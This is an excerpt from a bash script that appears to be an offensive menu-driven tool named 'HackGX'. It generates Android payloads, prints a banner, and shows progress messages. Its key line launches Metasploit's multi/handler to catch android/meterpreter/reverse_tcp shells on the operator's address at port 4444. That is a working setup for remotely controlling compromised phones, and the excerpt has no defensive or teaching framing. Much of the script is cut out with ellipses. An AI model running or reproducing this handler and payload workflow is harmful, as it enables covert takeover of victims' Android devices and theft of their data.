...
echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
sleep 0.2s
echo -e "      $red developer : $green Anonymous GX "
sleep 0.2s
...
sleep 3s 
echo ''
echo "$green your data saved successfully "
sleep 0.2s
...
if [ $ch == 1 ]; then 
    ...
    sleep 0.4s 
    echo -e "$green saved to > HackGX/$path"
elif [ $ch == 2 ]; then
    sleep 1s
    clear
    echo -e "$green Generating your payload please wait ...."
  ...
  if [ $lch == 1 ]; then 
        ...
        msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip ; set lport 4444 ; run "
  elif [ $lch == 2 ]; then
            sleep 0.2s
            echo ''
    ...
    echo -e "$red Error : please choose an number from list {1,2,3,4}"
    sleep 3s
    clear 
